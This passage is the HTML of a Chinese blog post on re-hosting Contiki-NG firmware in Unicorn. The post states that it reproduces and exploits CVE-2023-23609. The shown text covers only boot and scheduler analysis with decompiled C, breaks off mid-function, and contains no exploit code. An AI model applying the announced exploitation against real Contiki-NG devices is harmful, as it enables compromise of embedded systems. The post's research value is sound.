@@ -1,0 +1,1874 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Contiki Re-hosting 小记 - Stay Hungry</title><meta name="Description" content="This is My New Hugo Site"><meta property="og:title" content="Contiki Re-hosting 小记" />
+<meta property="og:description" content="本文记录如何用 Unicorn 模拟执行操作系统 Contiki-NG，并在上面复现并利用 CVE-2023-23609 的故事。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://xidoo.top/2023/09/re-host/" /><meta property="og:image" content="http://xidoo.top/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-09-27T20:25:19+02:00" />
+<meta property="article:modified_time" content="2023-09-27T20:25:19+02:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://xidoo.top/logo.png"/>
+
+<meta name="twitter:title" content="Contiki Re-hosting 小记"/>
+<meta name="twitter:description" content="本文记录如何用 Unicorn 模拟执行操作系统 Contiki-NG，并在上面复现并利用 CVE-2023-23609 的故事。"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://xidoo.top/2023/09/re-host/" /><link rel="prev" href="http://xidoo.top/2023/05/rev_main/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Contiki Re-hosting 小记",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/xidoo.top\/2023\/09\/re-host\/"
+        },"genre": "posts","wordcount":  3384 ,
+        "url": "http:\/\/xidoo.top\/2023\/09\/re-host\/","datePublished": "2023-09-27T20:25:19+02:00","dateModified": "2023-09-27T20:25:19+02:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "x1do0"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/friends/"> Friends </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Stay Hungry">🚩 Stay hungry</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/friends/" title="">Friends</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Contiki Re-hosting 小记</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>x1do0</a></span>&nbsp;<span class="post-category">included in <a href="/categories/general/"><i class="far fa-folder fa-fw"></i>General</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-09-27">2023-09-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;3384 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;16 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#binary-分析">binary 分析</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#arm-cortex-m3-boot">ARM Cortex-M3 boot</a></li>
+            <li><a href="#main">main</a></li>
+            <li><a href="#一些题外话">一些题外话？</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#dma">DMA</a></li>
+                    <li><a href="#中断">中断</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#re-host">Re-host</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#准备工作">准备工作</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#extract-raw-binary">extract raw binary</a></li>
+                    <li><a href="#arm-cortex-m3-memory-layout">ARM Cortex-M3 memory layout</a></li>
+                    <li><a href="#如何模拟中断">如何模拟中断</a></li>
+                    <li><a href="#如何模拟硬件">如何模拟硬件</a></li>
+                    <li><a href="#如何跳过某些函数">如何跳过某些函数？</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+            <li><a href="#模拟程序并产生一个-reset-中断">模拟程序，并产生一个 reset 中断</a></li>
+            <li><a href="#触发更多中断复现-cve-2023-23609">触发更多中断，复现 CVE-2023-23609</a>
+              <ul>
+                <li>
+                  <ul>
+                    <li><a href="#如何走到漏洞函数">如何走到漏洞函数</a></li>
+                    <li><a href="#如何触发漏洞">如何触发漏洞</a></li>
+                    <li><a href="#控制-pc">控制 PC</a></li>
+                  </ul>
+                </li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#结束了吗">结束了吗？</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>本文记录如何用 Unicorn 模拟执行操作系统 Contiki-NG，并在上面复现并利用 CVE-2023-23609 的故事。</p>
+<h2 id="binary-分析">binary 分析</h2>
+<p>这个 <a href="../../../file/hello-world.elf" rel="">binary</a> 是一个固件（OS），并不是以前分析的应用程序，所以需要改变视角，对代码中出现的操作系统层面的工作要敏感点。</p>
+<h4 id="arm-cortex-m3-boot">ARM Cortex-M3 boot</h4>
+<p>既然它是一个操作系统，那么在 boot 的时候就必须遵守 ARM Cortex-M3 平台的规则。复习一下系统课中学到的 x86 操作系统的启动过程：按下电源，BOIS 把硬盘中的启动扇区搬到内存的 0xFFFFFFF0 （或是更耳熟的 0x7C00）处，开始从这个地址执行。</p>
+<p>在 ARM Cortex-M3 中，中断向量表会被映射到 0 地址处，boot 代码做了这些事情：去 0 地址处检索这个表，将第一个表项的值赋给 sp，第二个表项（也就是 reset handler）的值赋给 ip。这样的目的是 reset handler 可以用 C 写，因为在 reset handler 时栈已经初始化好了。参见 <a href="https://developer.arm.com/documentation/ka001328/latest/" target="_blank" rel="noopener noreffer">arm 官方 docs</a> 与 <a href="https://stackoverflow.com/questions/6139952/what-is-the-booting-process-for-arm" target="_blank" rel="noopener noreffer">what-is-the-booting-process-for-arm</a>。</p>
+<p><code>_text</code> 起始处（0x00202000）就是中断向量表（中断向量表每个表项是什么，在平台上是有<a href="https://developer.arm.com/documentation/dui0552/a/the-cortex-m3-processor/exception-model/vector-table?lang=en" target="_blank" rel="noopener noreffer">规定</a>的），它的第一个表项是 <code>_end</code>，第二个表项是 <code>reset_handler</code>，印证了前面的说法。点开 <code>reset_handler</code> 发现它是这样的：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="n">__noreturn</span> <span class="nf">reset_handler</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// r0
+</span><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// r1
+</span><span class="c1"></span>  <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// r2
+</span><span class="c1"></span>
+  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0x400D20B4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">255</span><span class="p">;</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ble_l2cap_tx_process</span><span class="p">,</span> <span class="mh">0x214920</span><span class="p">,</span> <span class="mh">0x362u</span><span class="p">);</span>  <span class="c1">// data
+</span><span class="c1"></span>  <span class="n">v0</span> <span class="o">=</span> <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rt_ticks_epoch</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x29EC</span><span class="p">);</span>          <span class="c1">// bss
+</span><span class="c1"></span>  <span class="n">main</span><span class="p">(</span><span class="n">v0</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>首先疑似是将什么寄存器设置为 255. 然后一个 memcpy 一个 memset。仔细观察可以发现，<code>ble_l2cap_tx_process</code> 其实是 <code>.data</code> 的起始处，<code>rt_ticks_epoch</code> 是 <code>.bss</code> 的起始处。所以其实是从 flash（映射到地址空间 <code>0x214920</code>） 里把数据拷贝到 <code>.data</code> 段，并且把 <code>.bss</code> 段清零。</p>
+<blockquote>
+<p>mqa: 平时说的把代码烧进板子，其实是拷贝进 flash（外部存储器，类似于硬盘）。嵌入式系统比较神奇的一个点是，代码可以直接在 flash 里运行（可以想象成代码可以直接在硬盘里跑）。但是码能直接跑，数据段还是得放进内存里，所以需要把数据段从 flash 里拷贝进来。至于清零 .bss 段就更正常了，因为这就是操作系统该干的事儿，它不像 Linux 已经把页管理抽象好了，.bss 段分配出来就是零页。</p>
+</blockquote>
+<p>真是豁然开朗，这样我们就走到了 main 函数。</p>
+<h4 id="main">main</h4>
+<p>接下来看看 main 里干了啥，首先就是一堆不明所以的硬件与软件初始化过程。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="n">__noreturn</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">uip_ds6_addr_t</span> <span class="o">*</span><span class="n">link_local</span><span class="p">;</span> <span class="c1">// r4
+</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// r4
+</span><span class="c1"></span>
+  <span class="n">platform_init_stage_one</span><span class="p">();</span>
+  <span class="n">clock_init</span><span class="p">();</span>
+  <span class="n">rtimer_init</span><span class="p">();</span>
+  <span class="n">process_init</span><span class="p">();</span>
+  <span class="n">process_start</span><span class="p">(</span><span class="o">&amp;</span><span class="n">etimer_process</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+  <span class="n">ctimer_init</span><span class="p">();</span>
+  <span class="n">watchdog_init</span><span class="p">();</span>
+  <span class="n">energest_init</span><span class="p">();</span>
+  <span class="n">stack_check_init</span><span class="p">();</span>
+  <span class="n">platform_init_stage_two</span><span class="p">();</span>
+  <span class="n">queuebuf_init</span><span class="p">();</span>
+  <span class="n">netstack_init</span><span class="p">();</span>
+  <span class="n">node_id_init</span><span class="p">();</span>
+  <span class="p">...</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>没有太多说法，稍微说说知道的东西（主要是知道的东西也不多）。watchdog 是硬件。然后 <code>platform_init_stage_one</code> 点进去有一个 <code>soc_init</code>，自如其名就是 System of Chips 初始化。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">soc_init</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">nvic_init</span><span class="p">();</span>
+  <span class="n">ioc_init</span><span class="p">();</span>
+  <span class="n">sys_ctrl_init</span><span class="p">();</span>
+  <span class="n">clock_init</span><span class="p">();</span>
+  <span class="n">lpm_init</span><span class="p">();</span>
+  <span class="n">rtimer_init</span><span class="p">();</span>
+  <span class="n">gpio_hal_init</span><span class="p">();</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>里面 <code>nvic_init</code> 是把中断向量表头赋值给一个 NVIC 寄存器（内存映射到了 0xE000ED08），具体是哪个寄存器都可以在 CorTex-M3 手册里查到。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">nvic_init</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">MEMORY</span><span class="p">[</span><span class="mh">0xE000ED08</span><span class="p">]</span> <span class="o">=</span> <span class="n">text</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>ioc 不知道是什么的缩写，lpm 不知道是什么的缩写，gpio_hal 指的是 gpio 硬件抽象层（一般是不同硬件厂商造出来的一层抽象，使得上层接口一致，并无需关心下层硬件细节）。gpio 是什么不知道。</p>
+<p>反正一系列初始化以后，固件打印出版本信息 <code>Starting Contiki-NG-release/v4.9-11-gfd7139694</code> 等。然后来分析一下它执行了哪些东西。</p>
+<p>最开始的一个 <code>process_start</code> 启动的是 tcpip_process。后续 <code>autostart_start</code> 挨个儿启动的 <code>autostart_processes</code> 列表里的进程，实际上里面就一个 hello_world_process。这两个 process 都由一个结构体表示，成员变量里记录了 entry point，对应地址就是要执行的函数，具体如下，不明所以。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_hello_world_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">etimer_set</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">,</span> <span class="mh">0x500u</span><span class="p">);</span>
+    <span class="k">goto</span> <span class="n">LABEL_6</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">==</span> <span class="mi">60</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">etimer_expired</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">)</span> <span class="p">)</span>
+      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="n">etimer_reset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">timer_0</span><span class="p">);</span>
+<span class="nl">LABEL_6</span><span class="p">:</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Hello, world&#34;</span><span class="p">);</span>
+    <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">60</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="kr">__fastcall</span> <span class="nf">process_thread_tcpip_process</span><span class="p">(</span><span class="n">pt</span> <span class="o">*</span><span class="n">process_pt</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">tcpip_event</span> <span class="o">=</span> <span class="n">process_alloc_event</span><span class="p">();</span>
+    <span class="n">etimer_set</span><span class="p">(</span><span class="o">&amp;</span><span class="n">periodic_0</span><span class="p">,</span> <span class="mh">0x40u</span><span class="p">);</span>
+    <span class="n">uip_init</span><span class="p">();</span>
+    <span class="n">init_1</span><span class="p">();</span>
+    <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">==</span> <span class="mi">833</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">eventhandler</span><span class="p">(</span><span class="n">ev</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+<span class="nl">LABEL_4</span><span class="p">:</span>
+    <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">833</span><span class="p">;</span>
+    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">process_pt</span><span class="o">-&gt;</span><span class="n">lc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>启动完这两个 process 之后，一个 While 循环里开始 <code>process_run</code>。注意 start 和 run 的区别，start 可以认为只是把 process 结构、资源准备好，而 run 才是真正地运行（简单来说就是修改 process 状态，让它跑起来），所以既然它是一个操作系统，那么这个 <code>process_run</code> 里理应出现它的调度算法。果然：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">process_run</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">poll_requested</span> <span class="p">)</span>
+    <span class="n">do_poll</span><span class="p">();</span>
+  <span class="n">do_event</span><span class="p">();</span>
+  <span class="k">return</span> <span class="n">poll_requested</span> <span class="o">+</span> <span class="n">nevents</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><code>do_poll</code> 里去遍历 <code>process_list</code>，根据前面的猜测那么这个 process_list 理应是在前面启动的过程中构建的。所以就是不停地遍历所有 process，看看有没有哪个需要启动了。如果有，那就 <code>call_process</code>。<code>do_event</code> 里也是类似。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">do_poll</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">process</span> <span class="o">*</span><span class="n">i</span><span class="p">;</span> <span class="c1">// r4
+</span><span class="c1"></span>
+  <span class="n">poll_requested</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">process_list</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">next</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">needspoll</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">i</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+      <span class="n">i</span><span class="o">-&gt;</span><span class="n">needspoll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="n">call_process</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mh">0x82u</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>总之是走到了 <code>call_process</code>，这里面一个大大地函数指针运行标志着我们分析的结束。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">call_process</span><span class="p">(</span><span class="n">process</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span> <span class="n">process_event_t</span> <span class="n">ev</span><span class="p">,</span> <span class="n">process_data_t</span> <span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// r5
+</span><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int8</span> <span class="p">(</span><span class="o">*</span><span class="kr">thread</span><span class="p">)(</span><span class="n">pt</span> <span class="o">*</span><span class="p">,</span> <span class="n">process_event_t</span><span class="p">,</span> <span class="n">process_data_t</span><span class="p">);</span> <span class="c1">// r3
+</span><span class="c1"></span>
+  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">v4</span> <span class="o">=</span> <span class="n">ev</span><span class="p">;</span>
+    <span class="kr">thread</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="kr">thread</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="kr">thread</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">process_current</span> <span class="o">=</span> <span class="n">p</span><span class="p">;</span>
+      <span class="n">p</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
